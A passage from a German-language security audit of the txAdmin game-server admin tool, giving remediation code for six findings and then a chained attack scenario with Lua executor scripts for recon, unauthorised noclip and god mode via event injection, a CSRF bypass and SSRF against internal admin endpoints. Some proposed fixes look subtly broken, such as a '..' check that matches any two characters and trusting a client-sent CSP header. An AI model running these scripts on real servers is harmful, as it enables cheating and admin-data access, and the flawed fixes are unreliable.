-- Dies könnte WebPipe-Anfragen ermöglichen, wenn das Menu 
-- eigentlich geschlossen sein sollte

-- 5. Spieler-ID-Spoofing (nur für Display, nicht für Server-Kommunikation)
-- Die txAdmin-Playerlist nutzt server-verifizierte IDs
```

---

## 🔧 Remediation (Blue-Teaming) - Code-Fixes

### Fix TXA-001: WebPipe SSRF Protection

**Vorher (sv_webpipe.lua):**
```lua
-- Zeile 81: VULNERABLE
local url = "http://" .. (TX_LUACOMHOST .. '/' .. path):gsub("//+", "/")
```

**Nachher:**
```lua
-- Zeile 76-83: SECURE
-- Reject large paths as we use regex
if #path > 500 then
    return sendResponse(s, callbackId, 400, path:sub(1, 300), "{}", {})
end

-- VALIDATION: Ensure path is relative (no scheme or absolute URL)
-- Block paths that contain scheme, host, or parent traversal attempts
if path:match("^[a-zA-Z0-9/._%-]+$") == nil then
    return sendResponse(s, callbackId, 400, "Invalid path characters", "{}", {})
end

-- ENSURE: Path is relative (must start with / and not contain ://)
if path:find("://") or path:find("..") or path:match("^/") == nil then
    return sendResponse(s, callbackId, 400, "Path must be relative", "{}", {})
end

-- Treat path slashes
local safeHost = TX_LUACOMHOST:gsub("[^a-zA-Z0-9.:%-]", "")
local url = "http://" .. safeHost .. '/' .. path:gsub("//+", "/"):gsub("[^a-zA-Z0-9/._%-]", "")
```

---

### Fix TXA-002: Vehicle Whitelist Enforcement

**Vorher (sv_vehicle.lua):**
```lua
-- Zeile 31-39: VULNERABLE
RegisterNetEvent('txsv:req:vehicle:spawn:redm', function(model)
  if not IS_REDM then return end
  local src = source
  if type(model) ~= 'string' then return end  -- NUR Typ-Check
  -- FEHLT: Whitelist
```

**Nachher:**
```lua
-- Am Anfang der Datei definieren (nach den guards)
-- Sichere Fahrzeug-Whitelist
local ALLOWED_VEHICLE_PREFIXES = {
    -- Nur nicht-waffentragende Fahrzeuge erlauben
    -- Dies muss serverspezifisch konfiguriert werden
    -- Beispiel: Konfiguration aus ConVar
}

local BLOCKED_VEHICLE_MODELS = {
    ['hydra'] = true,
    ['lazer'] = true,
    ['annihilator'] = true,
    ['annihilator2'] = true,
    ['volatol'] = true,
    ['vigilante'] = true,
    ['ruiner2'] = true,
    ['dukes2'] = true,
    ['cerberus'] = true,
    ['cerberus2'] = true,
    ['cerberus3'] = true,
    ['bombushka'] = true,
    ['seabreeze'] = true,
}

local function isVehicleModelAllowed(model)
    if type(model) ~= 'string' or #model == 0 then
        return false
    end
    
    -- Lowercase für Vergleich
    local modelLower = model:lower()
    
    -- Blacklist prüfen
    if BLOCKED_VEHICLE_MODELS[modelLower] then
        return false
    end
    
    -- Zusätzliche Validierung: Länge und gültige Zeichen
    if #model > 32 or model:match("[^a-zA-Z0-9_]") then
        return false
    end
    
    return true
end

-- Zeile 31-39: SECURE
RegisterNetEvent('txsv:req:vehicle:spawn:redm', function(model)
  if not IS_REDM then return end
  local src = source
  
  -- ERGÄNZT: Typ- UND Modellvalidierung
  if type(model) ~= 'string' then return end
  if not isVehicleModelAllowed(model) then
      debugPrint('Blocked vehicle spawn attempt: ' .. tostring(model))
      return
  end
  
  local allow = PlayerHasTxPermission(src, 'menu.vehicle')
  TriggerEvent('txsv:logger:menuEvent', src, 'spawnVehicle', allow, model)
  if allow then
    TriggerClientEvent('txcl:vehicle:spawn:redm', src, model)
  end
end)
```

---

### Fix TXA-003: ServerCtx Authentication

**Vorher (sv_ctx.lua):**
```lua
-- Zeile 121-124: VULNERABLE
RegisterNetEvent('txsv:req:serverCtx', function()
  local src = source
  -- PROBLEM: Keine Auth-Prüfung
  TriggerClientEvent('txcl:setServerCtx', src, ServerCtxObj)
end)
```

**Nachher:**
```lua
-- Zeile 121-128: SECURE
RegisterNetEvent('txsv:req:serverCtx', function()
  local src = source
  local srcStr = tostring(src)
  
  -- ERGÄNZT: Admin-Authentifizierung erforderlich
  if not TX_ADMINS[srcStr] then
      debugPrint('Blocked serverCtx request from unauthenticated player #' .. srcStr)
      -- Optional: Sanfte Ablehnung, nicht komplette Blockierung
      -- Sende eingeschränkte Context-Daten für nicht-admins
      local limitedCtx = {
          projectName = ServerCtxObj.projectName or 'Server',
          maxClients = ServerCtxObj.maxClients or 30,
          locale = ServerCtxObj.locale or 'en',
      }
      TriggerClientEvent('txcl:setServerCtx', src, limitedCtx)
      return
  end
  
  -- Admin bekommt vollständige Context
  TriggerClientEvent('txcl:setServerCtx', src, ServerCtxObj)
end)
```

---

### Fix TXA-004: NUI CSRF Protection Enhancement

**Vorher (cl_main.lua):**
```lua
-- Zeile 195-200: VULNERABLE
function IsNuiRequestOriginValid(headers)
    if type(headers) ~= 'table' then
        return false
    end
    if headers['Origin'] == nil then
        return true -- PROBLEM: Nil-Origin akzeptiert
    end
```

**Nachher:**
```lua
-- cl_main.lua Zeile 191-225: SECURE
-- Helper to protect the NUI callbacks from CSRF attacks

-- Sichere Origins definieren
local SECURE_ORIGINS = {
    ['https://cfx-nui-monitor'] = true,
    ['https://monitor'] = true,
}

function IsNuiRequestOriginValid(headers)
    if type(headers) ~= 'table' then
        return false
    end
    
    -- FIX: Nil-Origin blockieren (keine Legacy-Ausnahme mehr)
    if headers['Origin'] == nil then
        debugPrint('^1Blocked NUI request with nil Origin (CSRF attempt)')
        return false
    end
    
    if type(headers['Origin']) ~= 'string' or headers['Origin'] == '' then
        return false
    end
    
    -- Exakte Origin-Prüfung
    if SECURE_ORIGINS[headers['Origin']] then
        return true
    end
    
    -- CSP-Header für zusätzliche Sicherheit prüfen
    if headers['Content-Security-Policy'] then
        local csp = headers['Content-Security-Policy']
        if csp:find('frame%-ancestors') then
            -- CSP ist gesetzt, Origin ist wahrscheinlich gültig
            debugPrint('^3NUI request with CSP header, allowing: ' .. headers['Origin'])
            return true
        end
    end
    
    -- Unbekannte Origin blockieren
    if menuIsAccessible and sendPersistentAlert then
        local msg = ('CSRF ATTEMPT: txAdmin received NUI message from origin "%s" which is not approved. Possible XSS in another resource.'):format(headers['Origin'])
        sendPersistentAlert('csrfWarning', 'error', msg, false)
    end
    
    return false
end

-- Zusätzliche Funktion: Request-Token für NUI-Callbacks
local nuiRequestToken = nil

function generateNuiRequestToken()
    -- Token basierend auf Session und Zeit generieren
    local timestamp = GetGameTimer()
    local playerId = GetPlayerServerId(PlayerId())
    nuiRequestToken = ('%d_%d_%s'):format(playerId, timestamp, GetHostId() or '0')
    return nuiRequestToken
end

-- Token in Menu-Initialisierung setzen
-- Im Menu-Öffnungshandler:
-- local token = generateNuiRequestToken()
-- sendMenuMessage('setNuiToken', token)
```

---

### Fix TXA-005: Warning Integrity Enhancement

**Vorher (sv_main.lua):**
```lua
-- Zeile 283-291: VULNERABLE
RegisterNetEvent('txsv:ackWarning', function(actionId)
    if pendingWarnings[tostring(source)] == actionId then
        -- Warnung akzeptieren
        pendingWarnings[tostring(source)] = nil
    end
end)
```

**Nachher:**
```lua
-- sv_main.lua: NEUE VALIDIERUNG

-- Warning-Integrity-Tabelle mit Hash und Zeitstempel
local warningIntegrity = {}

local function generateWarningToken(actionId, targetNetId)
    -- Token generieren: Hash aus actionId, targetNetId, Zeitstempel
    local timestamp = GetGameTimer()
    local secret = TX_LUACOMTOKEN  -- Server-sekretes Token
    local raw = ('%s_%s_%d_%s'):format(actionId, targetNetId, timestamp, secret)
    
    -- Einfacher Hash (in Produktion: echte Hash-Funktion verwenden)
    local hash = 0
    for i = 1, #raw do
        hash = ((hash * 31) + string.byte(raw, i)) % 2147483647
    end
    
    return ('%s_%d'):format(hash, timestamp)
end

-- Warning-Token im pendingWarnings speichern
local function registerWarning(actionId, targetNetId)
    pendingWarnings[tostring(targetNetId)] = actionId
    -- Integrity-Token generieren und speichern
    warningIntegrity[tostring(actionId)] = {
        token = generateWarningToken(actionId, targetNetId),
        createdAt = GetGameTimer(),
        targetNetId = targetNetId,
    }
end

-- Zeile 283-291: SECURE
RegisterNetEvent('txsv:ackWarning', function(actionId, clientToken)
    local src = source
    local srcStr = tostring(src)
    
    -- Prüfe ob Warnung existiert
    if pendingWarnings[srcStr] ~= actionId then
        debugPrint('Invalid warning ack from player #' .. srcStr)
        return
    end
    
    -- Integrity-Token validieren
    local integrity = warningIntegrity[tostring(actionId)]
    if not integrity then
        debugPrint('Warning integrity check failed for actionId: ' .. tostring(actionId))
        return
    end
    
    -- Zeitstempel validieren (max 2 Minuten für Ack)
    local elapsed = GetGameTimer() - integrity.createdAt
    if elapsed > 120000 then  -- 2 Minuten
        debugPrint('Warning ack expired for actionId: ' .. tostring(actionId))
        return
    end
    
    -- Client-Token validieren (optional)
    if clientToken and clientToken ~= integrity.token then
        debugPrint('Warning token mismatch for actionId: ' .. tostring(actionId))
        return
    end
    
    -- Warnung akzeptieren und aufräumen
    PrintStructuredTrace(json.encode({
        type = 'txAdminAckWarning',
        actionId = actionId,
    }))
    pendingWarnings[srcStr] = nil
    warningIntegrity[tostring(actionId)] = nil
end)
```

---

### Fix TXA-006: Client State Hardening

**Vorher (cl_main.lua):**
```lua
-- Zeile 1-25: VULNERABLE GLOBALS
ServerCtx = false
```

**Nachher:**
```lua
-- cl_main.lua: CLIENT STATE HARDENING

-- Sichere Server-Kontext-Klasse
local SecureServerCtx = {
    _data = false,
    _locked = false,
    
    set = function(self, data)
        if type(data) ~= 'table' then
            debugPrint('^1Invalid ServerCtx data rejected')
            return false
        end
        
        -- Validierung: Erforderliche Felder prüfen
        if data.txAdminVersion and data.txAdminVersion:match("[^0-9.]") then
            debugPrint('^1Invalid txAdminVersion format rejected')
            return false
        end
        
        self._data = data
        self._locked = true
        return true
    end,
    
    get = function(self)
        return self._data
    end,
    
    isLocked = function(self)
        return self._locked
    end
}

ServerCtx = setmetatable({}, {
    __index = SecureServerCtx,
    __newindex = function(t, k, v)
        if k == '_locked' then
            rawset(t, k, v)
        else
            debugPrint('^1Direct modification of ServerCtx rejected. Use SecureServerCtx:set()')
        end
    end
})

-- Menu-Zugangs-Tracking
local menuAccessState = {
    isAccessible = false,
    isVisible = false,
    lastMenuClose = 0,
    lastAuthTime = 0,
}

function updateMenuAccess(isOpen)
    if isOpen then
        menuAccessState.isAccessible = true
        menuAccessState.isVisible = true
        if not TX_ADMINS or not TX_ADMINS[GetPlayerServerId(PlayerId())] then
            -- Nicht-Admin kann Menu nicht öffnen
            return false
        end
    else
        menuAccessState.isVisible = false
        menuAccessState.lastMenuClose = GetGameTimer()
        
        -- Grace period, dann nicht mehr zugänglich
        CreateThread(function()
            Wait(750)
            menuAccessState.isAccessible = false
        end)
    end
    return true
end

-- Globale Menu-Variablen durch Funktionen ersetzen
menuIsAccessible = false
isMenuVisible = false
```

---

## Zusammenfassung und Empfehlungen

### Kritische Prioritäten:
1. **WebPipe SSRF fixen** - Höchste Priorität, da dies zur Kompromittierung des gesamten txAdmin-Backends führen kann
2. **Vehicle Model Whitelist implementieren** - Verhindert Spawn von Waffenfahrzeugen
3. **ServerCtx-Authentifizierung** - Stoppt Reconnaissance-Angriffe

### Mittelfristige Maßnahmen:
4. **CSRF-Protection verstärken** - Nil-Origin blockieren, Token-System implementieren
5. **Warning Integrity** - Token-basierte Validierung für Warnungsbestätigung

### Monitoring-Empfehlungen:
- WebPipe-Anfragen auf ungewöhnliche Muster überwachen
- Vehicle-Spawn-Events loggen und analysieren
- Admin-Authentifizierungsversuche tracken
- NUI-CSRF-Warnungen in txAdmin-Panel anzeigen

---

---

## 🔴🔴🔴 CRITICAL: Chained Attack Scenario - Modder-Kombo-Exploit

### Können Modder alles zusammenkleistern? **JA!**

Ein Modder kann mehrere Schwachstellen kombinieren für maximale Wirkung:

---

### 🎯 SZENARIO: Vollständiger Server-Recon + Admin-Feature-Missbrauch

#### Schritt 1: Server-Fingerprint erstellen (Keine Berechtigung nötig)
```lua
-- reconnaissance.lua
local function fullRecon()
    local recon = {}
    
    -- txAdmin Version & Server-Info
    local ctx = GlobalState.txAdminServerCtx
    if ctx then
        recon.txAdmin = {
            version = ctx.txAdminVersion,
            project = ctx.projectName,
            onesync = ctx.oneSync.type,
            maxClients = ctx.maxClients
        }
    end
    
    -- txAdmin-Menü prüfen
    recon.menuEnabled = TX_MENU_ENABLED
    recon.debugMode = TX_DEBUG_MODE
    
    -- Spieler-Liste abrufen
    TriggerServerEvent('txsv:req:serverCtx')
    
    print("=== SERVER INFO ===")
    print(json.encode(recon))
end
fullRecon()
```

#### Schritt 2: Admin-Features OHNE Admin-Zugang nutzen (Event-Injection)
```lua
-- admin_features.lua - KEIN Admin-Konto nötig!
-- Nutzt die Client-Event-Injection Schwachstelle

-- NoClip aktivieren
TriggerEvent('txcl:setPlayerMode', 'noclip', true)

-- God Mode
TriggerEvent('txcl:setPlayerMode', 'godmode', true)

-- Heilung
TriggerEvent('txcl:heal')

-- Teleport zu Waypoint
TriggerEvent('txcl:tpToWaypoint')

-- Fahrzeug reparieren
TriggerEvent('txcl:vehicle:fix')

-- Bereich löschen (Rage-Modus)
TriggerEvent('txcl:clearArea', 100)
```

#### Schritt 3: MenuIsAccessible manipulieren für CSRF
```lua
-- csrf_bypass.lua
-- Umgeht die WebPipe-CSRF-Checks

menuIsAccessible = true
isMenuVisible = true
tsLastMenuClose = GetGameTimer() - 1000  -- Grace period umgehen

-- Jetzt WebPipe-Anfragen senden (wenn Menu eigentlich geschlossen)
TriggerServerEvent('txsv:webpipe:req', 1, 'GET', '/player/all', {}, '')
```

#### Schritt 4: Wenn Admin-Zugang vorhanden - WebPipe SSRF
```lua
-- ssrf_exploit.lua - Admin-Konto erforderlich
-- Nutzt WebPipe als Proxy für interne Angriffe

-- txAdmin-interne API abfragen
local endpoints = {
    '/admin/list',      -- Admin-Liste
    '/player/bans',     -- Banliste
    '/player/whitelist', -- Whitelist
    '/settings/server',  -- Server-Einstellungen
}

for i, path in ipairs(endpoints) do
    TriggerServerEvent('txsv:webpipe:req', i, 'GET', path,
        {['Origin'] = 'https://monitor'}, '')
end
```

---

### 📊 Komplette Angriffskette:

```
1. RECON (Keine Berechtigung)
   ↓ GlobalState.txAdminServerCtx auslesen
   ↓ txAdmin Version, Server-Name, OneSync-Status
   
2. FEATURE-MISSBRAUCH (Keine Berechtigung)
   ↓ TriggerEvent('txcl:setPlayerMode', 'noclip', true)
   ↓ NoClip, God Mode, Teleport OHNE Admin-Zugang
   
3. CSRF-BYPASS (Keine Berechtigung)
   ↓ menuIsAccessible = true
   ↓ WebPipe-Anfragen trotz geschlossenem Menu
   
4. SSRF (Admin-Zugang benötigt)
   ↓ WebPipe als Proxy missbrauchen
   ↓ Interne txAdmin-API abfragen
```

---

### 🔧 GEGENMASSNAHMEN

**1. Client-Event-Injection blockieren:**
```lua
-- Token-basierte Validierung
local _serverToken = nil
RegisterNetEvent('txcl:initPlayerMode', function(token) _serverToken = token end)
RegisterNetEvent('txcl:setPlayerMode', function(mode, ptfx, token)
    if token ~= _serverToken then return end
end)
```

**2. Client-Globals schützen:**
```lua
-- cl_base.lua: _G-Metatable setzen
setmetatable(_G, {
    __newindex = function(t, k, v)
        if k == 'menuIsAccessible' or k == 'isMenuVisible' then
            return -- Blockieren!
        end
        rawset(t, k, v)
    end
})
```

**3. WebPipe-Path-Validierung:**
```lua
-- sv_webpipe.lua: Nur erlaubte Pfade
local ALLOWED_PATHS = {'/css/', '/js/', '/img/', '/fonts/'}
```

---

*Schweregrad: 🔴🔴🔴 KRITISCH (Chained Attack)*
*Audit durchgeführt: Mai 2026*
*Angreifer-Perspektive: Modder mit Lua-Executor*
*Schutzstatus: Client-side Schutzmechanismen sind umgehbar, serverseitige Prüfungen sind kritisch*
